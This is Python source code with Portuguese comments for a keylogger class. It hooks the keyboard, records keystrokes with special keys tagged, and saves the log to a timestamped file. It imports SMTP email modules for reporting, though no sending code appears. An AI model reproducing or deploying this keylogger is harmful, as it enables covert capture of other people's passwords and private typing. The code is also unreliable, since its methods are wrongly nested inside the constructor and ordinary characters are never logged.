import keyboard
import smtplib #Envio de email usando protocolo SMTP (gmail)
from threading import Timer # Intervalo de tempo
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

class KeyLogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method

        # Log das teclas digitadas
        self.log = ""

        # Define o tempo de inicio e fim da execução
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

        def callback(self, event):
            # Esse evento sempre sera chamada quando uma tecla for digitada

            name = event.name

            if len(name) > 1:
                # Não é um caracter ou chave especial
                if name == "space":
                    name = " "
                elif name == "enter":
                    # adicionar uma nova linha sempre que um ENTER for pressionado
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    # substitua os espaços por sublinhados
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
                    # adiciona o nome da chave a variável global `self.log`
                self.log += name

        def update_filename(self):
            # define o nome do arquivo a ser identificado pelas datas de início e fim

            start_dt_str = str(self.start_dt)[:7].replace(" ", "-").replace(":", "")
            end_dt_str = str(self.end_dt)[:7].replace(" ", "-").replace(":", "")
            self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

        def report_to_file(self):
            with open(f"{self.filename}.txt", "w") as f:
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

